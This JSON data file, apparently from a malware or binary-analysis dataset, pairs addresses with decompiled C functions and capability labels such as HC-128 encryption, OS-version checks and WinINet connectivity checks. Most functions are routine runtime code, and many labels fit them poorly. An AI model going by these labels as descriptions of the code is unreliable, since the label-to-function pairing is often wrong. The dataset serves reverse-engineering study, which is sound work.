{
    "004059e0": {
        "rules": [
            "hash data using aphash/10489b186fc44711a1078750698db7a9",
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.004059e0(void)\n\n{\n    int32_t iVar1;\n    uint8_t *puVar2;\n    uint8_t uVar3;\n    uint32_t uVar4;\n    uint8_t uVar5;\n    int32_t iVar6;\n    uint32_t var_ch;\n    uint var_6h;\n    uint var_1h;\n    \n    iVar6 = 8;\n    iVar1 = 0;\n    do {\n        *(iVar1 + 0x414288) = *(iVar1 + 0x414268);\n        *(iVar1 + 0x414289) = *(iVar1 + 0x414269);\n        *(iVar1 + 0x41428a) = *(iVar1 + 0x41426a);\n        *(iVar1 + 0x41428b) = *(iVar1 + 0x41426b);\n        iVar1 = iVar1 + 4;\n        iVar6 = iVar6 + -1;\n    } while (iVar6 != 0);\n    var_ch = 8;\n    puVar2 = 0x4142a5;\n    do {\n        uVar3 = puVar2[-1];\n        uVar5 = *puVar2;\n        var_6h._1_1_ = puVar2[2];\n        var_6h._0_1_ = puVar2[1];\n        if ((var_ch & 7) == 0) {\n            var_6h._0_1_ = *(var_6h._1_1_ + 0x403fb0);\n            uVar4 = uVar5;\n            uVar5 = *(puVar2[1] + 0x403fb0);\n            var_6h._1_1_ = *(uVar3 + 0x403fb0);\n            uVar3 = *(uVar4 + 0x403fb0) ^ *((var_ch >> 3) + 0x4041b0);\n        }\n        puVar2[3] = puVar2[-0x1d] ^ uVar3;\n        puVar2[4] = puVar2[-0x1c] ^ uVar5;\n        puVar2[5] = puVar2[-0x1b] ^ var_6h;\n        var_ch = var_ch + 1;\n        puVar2[6] = puVar2[-0x1a] ^ var_6h._1_1_;\n        puVar2 = puVar2 + 4;\n    } while (var_ch < 0x3c);\n    return;\n}\n",
        "token_count": 588
    },
    "00405b3e": {
        "rules": [
            "encrypt data using HC-128/f6b71aea27f34766a10ff27131cf0227"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_3h\n\nvoid __fastcall fcn.00405b3e(int32_t param_1)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    uint8_t *puVar4;\n    uint8_t uVar5;\n    int32_t iVar6;\n    uint var_3h;\n    \n    iVar6 = 4;\n    puVar4 = param_1 + 2;\n    do {\n        uVar2 = puVar4[1] ^ *puVar4;\n        uVar1 = puVar4[-2];\n        uVar3 = uVar2 ^ uVar1 ^ puVar4[-1];\n        uVar5 = uVar1 ^ puVar4[-1];\n        puVar4[-2] = (uVar5 >> 7) * -0x1b ^ uVar5 * '\\x02' ^ uVar1 ^ uVar3;\n        puVar4[-1] = ((puVar4[-1] ^ *puVar4) >> 7) * -0x1b ^ (puVar4[-1] ^ *puVar4) * '\\x02' ^ puVar4[-1] ^ uVar3;\n        *puVar4 = (uVar2 >> 7) * -0x1b ^ uVar2 * '\\x02' ^ *puVar4 ^ uVar3;\n        iVar6 = iVar6 + -1;\n        puVar4[1] = ((puVar4[1] ^ uVar1) >> 7) * -0x1b ^ (puVar4[1] ^ uVar1) * '\\x02' ^ puVar4[1] ^ uVar3;\n        puVar4 = puVar4 + 4;\n    } while (iVar6 != 0);\n    return;\n}\n",
        "token_count": 413
    },
    "00405c90": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405c90(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint *unaff_ESI;\n    int32_t unaff_EDI;\n    \n    if ((arg_8h != '\\0') && (0xf < unaff_ESI[5])) {\n        arg_ch = *unaff_ESI;\n        if (unaff_EDI != 0) {\n            fcn.0040b3b0(unaff_ESI, arg_ch, unaff_EDI);\n        }\n        fcn.0040b84b(arg_ch);\n    }\n    unaff_ESI[5] = 0xf;\n    unaff_ESI[4] = unaff_EDI;\n    *(unaff_EDI + unaff_ESI) = 0;\n    return;\n}\n",
        "token_count": 173
    },
    "0040b8c0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040b8c0(int32_t param_1)\n\n{\n    if (*(param_1 + 8) != '\\0') {\n        fcn.0040d69d(*(param_1 + 4));\n    }\n    *(param_1 + 4) = 0;\n    *(param_1 + 8) = 0;\n    return;\n}\n",
        "token_count": 85
    },
    "004072b8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004072b8(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint *in_EAX;\n    uint *puVar1;\n    int32_t *unaff_EBX;\n    \n    puVar1 = in_EAX;\n    if (0xf < in_EAX[5]) {\n        puVar1 = *in_EAX;\n    }\n    if (arg_8h == 0) {\n        arg_8h = 0;\n    }\n    else {\n        arg_8h = arg_8h - puVar1;\n    }\n    fcn.0040724e();\n    if (0xf < in_EAX[5]) {\n        in_EAX = *in_EAX;\n    }\n    *unaff_EBX = in_EAX + arg_8h;\n    return;\n}\n",
        "token_count": 182
    },
    "00407574": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407574(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint *unaff_ESI;\n    int32_t unaff_EDI;\n    \n    if ((arg_8h != '\\0') && (7 < unaff_ESI[5])) {\n        arg_ch = *unaff_ESI;\n        if (unaff_EDI != 0) {\n            fcn.0040b3b0(unaff_ESI, arg_ch, unaff_EDI * 2);\n        }\n        fcn.0040b84b(arg_ch);\n    }\n    unaff_ESI[5] = 7;\n    unaff_ESI[4] = unaff_EDI;\n    *(unaff_ESI + unaff_EDI * 2) = 0;\n    return;\n}\n",
        "token_count": 176
    },
    "00407770": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00407770(uint arg_8h)\n\n{\n    uint *in_EAX;\n    uint32_t unaff_EBX;\n    \n    if (0x7ffffffe < unaff_EBX) {\n        fcn.0040b2d9(0x4049e4);\n    }\n    if (in_EAX[5] < unaff_EBX) {\n        fcn.004078fc(in_EAX, unaff_EBX, in_EAX[4]);\n    }\n    else if ((arg_8h == '\\0') || (7 < unaff_EBX)) {\n        if (unaff_EBX == 0) {\n            in_EAX[4] = 0;\n            if (7 < in_EAX[5]) {\n                in_EAX = *in_EAX;\n            }\n            *in_EAX = 0;\n        }\n    }\n    else {\n        fcn.00407574(1);\n    }\n    return unaff_EBX != 0;\n}\n",
        "token_count": 217
    },
    "004077dc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.004077dc(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t *piVar6;\n    uint32_t uVar7;\n    int32_t unaff_EBP;\n    uint var_18h;\n    uint var_14h;\n    uint var_4h;\n    \n    fcn.00411c3c(0xc);\n    piVar1 = *(unaff_EBP + 8);\n    uVar7 = *(unaff_EBP + 0xc) | 0xf;\n    if (uVar7 == 0xffffffff) {\n        uVar7 = *(unaff_EBP + 0xc);\n    }\n    else {\n        uVar2 = piVar1[5];\n        *(unaff_EBP + -0x14) = uVar2;\n        *(unaff_EBP + -0x14) = *(unaff_EBP + -0x14) >> 1;\n        uVar3 = *(unaff_EBP + -0x14);\n        if ((uVar7 / 3 < uVar3) && (uVar7 = 0xfffffffe,  uVar2 <= -uVar3 - 2)) {\n            uVar7 = uVar3 + uVar2;\n        }\n    }\n    *(unaff_EBP + -4) = 0;\n    uVar5 = fcn.00407a26(uVar7 + 1);\n    *(unaff_EBP + -0x18) = uVar5;\n    *(unaff_EBP + -4) = 0xffffffff;\n    if (*(unaff_EBP + 0x10) != 0) {\n        piVar6 = piVar1;\n        if (0xf < piVar1[5]) {\n            piVar6 = *piVar1;\n        }\n        fcn.0040b3b0(*(unaff_EBP + -0x18), piVar6, *(unaff_EBP + 0x10));\n    }\n    fcn.00405c90(1);\n    piVar6 = *(unaff_EBP + -0x18);\n    *piVar1 = piVar6;\n    piVar1[5] = uVar7;\n    iVar4 = *(unaff_EBP + 0x10);\n    piVar1[4] = iVar4;\n    if (uVar7 < 0x10) {\n        piVar6 = piVar1;\n    }\n    *(piVar6 + iVar4) = 0;\n    fcn.00411c72();\n    return;\n}\n",
        "token_count": 616
    },
    "004078c1": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004078c1(uint *arg_8h)\n\n{\n    uint *in_EAX;\n    uint *puVar1;\n    \n    if (arg_8h != NULL) {\n        puVar1 = in_EAX;\n        if (0xf < in_EAX[5]) {\n            puVar1 = *in_EAX;\n        }\n        if (puVar1 <= arg_8h) {\n            puVar1 = in_EAX;\n            if (0xf < in_EAX[5]) {\n                puVar1 = *in_EAX;\n            }\n            in_EAX = in_EAX[4] + puVar1;\n            if (arg_8h < in_EAX) {\n                return CONCAT31(in_EAX >> 8, 1);\n            }\n        }\n    }\n    return in_EAX & 0xffffff00;\n}\n",
        "token_count": 189
    },
    "004079ea": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004079ea(uint *arg_8h)\n\n{\n    uint *in_EAX;\n    uint *puVar1;\n    \n    if (arg_8h != NULL) {\n        puVar1 = in_EAX;\n        if (7 < in_EAX[5]) {\n            puVar1 = *in_EAX;\n        }\n        if (puVar1 <= arg_8h) {\n            puVar1 = in_EAX;\n            if (7 < in_EAX[5]) {\n                puVar1 = *in_EAX;\n            }\n            in_EAX = puVar1 + in_EAX[4] * 2;\n            if (arg_8h < in_EAX) {\n                return CONCAT31(in_EAX >> 8, 1);\n            }\n        }\n    }\n    return in_EAX & 0xffffff00;\n}\n",
        "token_count": 189
    },
    "0040b39f": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040b39f(uint arg_8h)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    int32_t in_ECX;\n    uint in_EDX;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    ushort in_ES;\n    ushort in_CS;\n    ushort in_SS;\n    ushort in_DS;\n    ushort in_FS;\n    ushort in_GS;\n    uint8_t in_AF;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    uint unaff_retaddr;\n    int32_t var_328h;\n    uint var_324h;\n    uint var_320h;\n    \n    if (in_ECX == *0x401304) {\n        return;\n    }\n    *0x4136e0 = (in_NT & 1) * 0x4000 | SBORROW4(&stack0xfffffffc, 0x328) * 0x800 | (in_IF & 1) * 0x200 |\n                (in_TF & 1) * 0x100 | (&var_328h < 0) * 0x80 | (*0x10 == 0x32c) * 0x40 | (in_AF & 1) * 0x10 |\n                ((POPCOUNT(&var_328h & 0xff) & 1U) == 0) * 4 | &stack0xfffffffc < 0x328 | (in_ID & 1) * 0x200000 |\n                (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 | (in_AC & 1) * 0x40000;\n    *0x4136e4 = &arg_8h;\n    *0x413620 = 0x10001;\n    *0x4135c8 = 0xc0000409;\n    *0x4135cc = 1;\n    var_328h = *0x401304;\n    var_324h = *0x401308;\n    *0x4135d4 = unaff_retaddr;\n    *0x4136ac = in_GS;\n    *0x4136b0 = in_FS;\n    *0x4136b4 = in_ES;\n    *0x4136b8 = in_DS;\n    *0x4136bc = unaff_EDI;\n    *0x4136c0 = unaff_ESI;\n    *0x4136c4 = unaff_EBX;\n    *0x4136c8 = in_EDX;\n    *0x4136cc = in_ECX;\n    *0x4136d0 = in_EAX;\n    *0x4136d4 = unaff_EBP;\n    *0x4136d8 = unaff_retaddr;\n    *0x4136dc = in_CS;\n    *0x4136e8 = in_SS;\n    *0x413618 = (*_sym.imp.KERNEL32.dll_IsDebuggerPresent)();\n    fcn.0040f62a(1);\n    (*_sym.imp.KERNEL32.dll_SetUnhandledExceptionFilter)(0);\n    (*_sym.imp.KERNEL32.dll_UnhandledExceptionFilter)(0x402138);\n    if (*0x413618 == 0) {\n        fcn.0040f62a(1);\n    }\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0xc0000409);\n    (*_sym.imp.KERNEL32.dll_TerminateProcess)(uVar1);\n    return;\n}\n",
        "token_count": 836
    },
    "0040d69d": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040d69d(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint uVar3;\n    \n    if (arg_8h != 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_HeapFree)(*0x413f58, 0, arg_8h);\n        if (iVar1 == 0) {\n            puVar2 = fcn.0040e667();\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            uVar3 = fcn.0040e625(uVar3);\n            *puVar2 = uVar3;\n        }\n    }\n    return;\n}\n",
        "token_count": 157
    },
    "null": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "0040de11": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Possible PIC construction at 0x0040df17: Changing call to branch\n// WARNING: Removing unreachable block (ram,0x0040df1c)\n// WARNING: Removing unreachable block (ram,0x0040df4b)\n// WARNING: Removing unreachable block (ram,0x0040df22)\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040de11(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    code *pcVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    int32_t unaff_EBP;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.0040dfc0(0x413030, 0x20);\n    fcn.0040f8db(8);\n    *(unaff_EBP + -4) = 0;\n    pcVar1 = _sym.imp.KERNEL32.dll_DecodePointer;\n    if (*0x413920 != 1) {\n        *0x41391c = 1;\n        *0x413918 = *(unaff_EBP + 0x10);\n        if (*(unaff_EBP + 0xc) == 0) {\n            piVar2 = (*_sym.imp.KERNEL32.dll_DecodePointer)(*0x414508);\n            *(unaff_EBP + -0x30) = piVar2;\n            if (piVar2 != NULL) {\n                piVar3 = (*pcVar1)(*0x414504);\n                *(unaff_EBP + -0x2c) = piVar3;\n                *(unaff_EBP + -0x24) = piVar2;\n                *(unaff_EBP + -0x28) = piVar3;\n                while( true ) {\n                    piVar3 = piVar3 + -1;\n                    *(unaff_EBP + -0x2c) = piVar3;\n                    if (piVar3 < piVar2) break;\n                    iVar4 = fcn.0040e928();\n                    if (*piVar3 != iVar4) {\n                        if (piVar3 < piVar2) break;\n                        pcVar5 = (*pcVar1)(*piVar3);\n                        iVar4 = fcn.0040e928();\n                        *piVar3 = iVar4;\n                        (*pcVar5)();\n                        iVar4 = (*pcVar1)(*0x414508);\n                        piVar2 = (*pcVar1)(*0x414504);\n                        if ((*(unaff_EBP + -0x24) != iVar4) || (*(unaff_EBP + -0x28) != piVar2)) {\n                            *(unaff_EBP + -0x24) = iVar4;\n                            *(unaff_EBP + -0x30) = iVar4;\n                            *(unaff_EBP + -0x28) = piVar2;\n                            *(unaff_EBP + -0x2c) = piVar2;\n                            piVar3 = piVar2;\n                        }\n                        piVar2 = *(unaff_EBP + -0x30);\n                    }\n                }\n            }\n            *(unaff_EBP + -0x1c) = 0x401264;\n            while (*(unaff_EBP + -0x1c) < 0x401268) {\n                if (**(unaff_EBP + -0x1c) != NULL) {\n                    (***(unaff_EBP + -0x1c))();\n                }\n                *(unaff_EBP + -0x1c) = *(unaff_EBP + -0x1c) + 4;\n            }\n        }\n        *(unaff_EBP + -0x20) = 0x40126c;\n        while (*(unaff_EBP + -0x20) < 0x401270) {\n            if (**(unaff_EBP + -0x20) != NULL) {\n                (***(unaff_EBP + -0x20))();\n            }\n            *(unaff_EBP + -0x20) = *(unaff_EBP + -0x20) + 4;\n        }\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    if (*(unaff_EBP + 0x10) != 0) {\n        fcn.0040f802(8);\n    }\n    return;\n}\n",
        "token_count": 1009
    },
    "0040fb6c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.0040fb6c(void)\n\n{\n    int32_t unaff_EBP;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x1c) != 0) {\n        fcn.0040f802(0);\n    }\n    return;\n}\n",
        "token_count": 66
    },
    "0040fe92": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040fe92(uint arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    code *pcVar4;\n    code *pcVar5;\n    code *pcVar6;\n    uint unaff_EBX;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x401304 ^ &stack0xfffffffc;\n    var_20h = arg_8h;\n    var_1ch = arg_ch;\n    var_18h = fcn.0040e928();\n    var_14h = 0;\n    if (*0x41422c == 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_LoadLibraryW)(0x4033c0);\n        pcVar6 = _sym.imp.KERNEL32.dll_GetProcAddress;\n        if ((iVar1 == 0) ||\n           (iVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar1, 0x4033b4), \n           pcVar4 = _sym.imp.KERNEL32.dll_EncodePointer,  iVar2 == 0)) goto code_r0x0040ffef;\n        *0x41422c = (*_sym.imp.KERNEL32.dll_EncodePointer)(iVar2);\n        uVar3 = (*pcVar6)(iVar1, 0x4033a4);\n        *0x414230 = (*pcVar4)(uVar3);\n        uVar3 = (*pcVar6)(iVar1, 0x403390);\n        *0x414234 = (*pcVar4)(uVar3);\n        uVar3 = (*pcVar6)(iVar1, 0x403374);\n        *0x41423c = (*pcVar4)(uVar3);\n        if (*0x41423c != 0) {\n            uVar3 = (*pcVar6)(iVar1, 0x40335c);\n            *0x414238 = (*pcVar4)(uVar3);\n        }\n    }\n    pcVar6 = _sym.imp.KERNEL32.dll_DecodePointer;\n    if ((*0x414238 == var_18h) || (*0x41423c == var_18h)) {\ncode_r0x0040ff9e:\n        if ((((*0x414230 != var_18h) && (pcVar4 = (*pcVar6)(*0x414230),  pcVar4 != NULL)) &&\n            (var_14h = (*pcVar4)(),  var_14h != 0)) &&\n           ((*0x414234 != var_18h && (pcVar4 = (*pcVar6)(*0x414234),  pcVar4 != NULL)))) {\n            var_14h = (*pcVar4)(var_14h);\n        }\n    }\n    else {\n        pcVar4 = (*_sym.imp.KERNEL32.dll_DecodePointer)(*0x414238);\n        pcVar5 = (*pcVar6)(*0x41423c);\n        if (((pcVar4 == NULL) || (pcVar5 == NULL)) ||\n           (((iVar1 = (*pcVar4)(),  iVar1 != 0 && (iVar1 = (*pcVar5)(iVar1, 1, &var_10h, 0xc, &var_24h),  iVar1 != 0))\n            && ((var_8h & 1) != 0)))) goto code_r0x0040ff9e;\n        arg_10h = arg_10h | 0x200000;\n    }\n    pcVar6 = (*pcVar6)(*0x41422c);\n    if (pcVar6 != NULL) {\n        (*pcVar6)(var_14h, var_20h, var_1ch, arg_10h);\n    }\ncode_r0x0040ffef:\n    fcn.0040b39f(unaff_EBX);\n    return;\n}\n",
        "token_count": 928
    },
    "0041194e": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.0041194e(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint arg_8h, uint arg_ch, uint noname_17, uint noname_18, uint arg_18h, uint arg_1ch, \n            uint arg_20h)\n\n{\n    int32_t iVar1;\n    int32_t *in_FS_OFFSET;\n    uint *var_8h_3;\n    uint *var_ch_2;\n    uint var_10h_2;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    uint var_38h;\n    uint *var_34h;\n    uint var_30h;\n    code *var_2ch;\n    uint *var_28h_2;\n    code *pcStack40;\n    uint32_t uStack36;\n    uint uStack32;\n    uint *puStack28;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uchar *var_8h_2;\n    int32_t var_4h_2;\n    \n    var_8h_2 = &stack0xfffffffc;\n    puStack16 = &stack0xffffffc0;\n    if (var_8h_3 == 0x123) {\n        *var_ch_2 = 0x4119f9;\n        var_38h = 1;\n    }\n    else {\n        pcStack40 = fcn.00411a25;\n        uStack36 = *0x401304 ^ &fcn.0041194e::var_28h_2;\n        uStack32 = var_24h;\n        puStack28 = var_ch_2;\n        uStack24 = var_20h;\n        uStack20 = var_1ch;\n        var_4h_2 = 0;\n        var_28h_2 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &fcn.0041194e::var_28h_2;\n        var_34h = var_8h_3;\n        var_30h = var_10h_2;\n        iVar1 = fcn.0040ead8();\n        var_2ch = *(iVar1 + 0x80);\n        (*var_2ch)(*var_8h_3, &fcn.0041194e::var_34h);\n        var_38h = 0;\n        if (var_4h_2 == 0) {\n            *in_FS_OFFSET = var_28h_2;\n        }\n        else {\n            *var_28h_2 = **in_FS_OFFSET;\n            *in_FS_OFFSET = var_28h_2;\n        }\n    }\n    return var_38h;\n}\n",
        "token_count": 723
    },
    "00411eda": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00411eda(uint arg_8h, uint noname_1, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t unaff_EBP;\n    int32_t iVar5;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.0040dfc0(0x413450, 0x10);\n    iVar1 = *(unaff_EBP + 0x10);\n    iVar2 = *(unaff_EBP + 8);\n    if (*(iVar1 + 4) < 0x81) {\n        iVar5 = *(iVar2 + 8);\n    }\n    else {\n        iVar5 = *(iVar2 + 8);\n    }\n    *(unaff_EBP + -0x1c) = iVar5;\n    iVar4 = fcn.0040ead8();\n    *(iVar4 + 0x90) = *(iVar4 + 0x90) + 1;\n    *(unaff_EBP + -4) = 0;\n    while (iVar5 != *(unaff_EBP + 0x14)) {\n        if ((iVar5 < 0) || (*(iVar1 + 4) <= iVar5)) {\n            fcn.0040f95a();\n        }\n        iVar4 = *(iVar1 + 8);\n        iVar3 = *(iVar4 + iVar5 * 8);\n        *(unaff_EBP + -0x20) = iVar3;\n        *(unaff_EBP + -4) = 1;\n        if (*(iVar4 + 4 + iVar5 * 8) != 0) {\n            *(iVar2 + 8) = iVar3;\n            fcn.00412ae0(*(*(iVar1 + 8) + 4 + iVar5 * 8), iVar2, 0x103);\n        }\n        *(unaff_EBP + -4) = 0;\n        *(unaff_EBP + -0x1c) = iVar3;\n        iVar5 = iVar3;\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    fcn.00411f9c();\n    if (iVar5 != *(unaff_EBP + 0x14)) {\n        fcn.0040f95a();\n    }\n    *(iVar2 + 8) = iVar5;\n    fcn.0040e005();\n    return;\n}\n",
        "token_count": 573
    },
    "00411f9c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
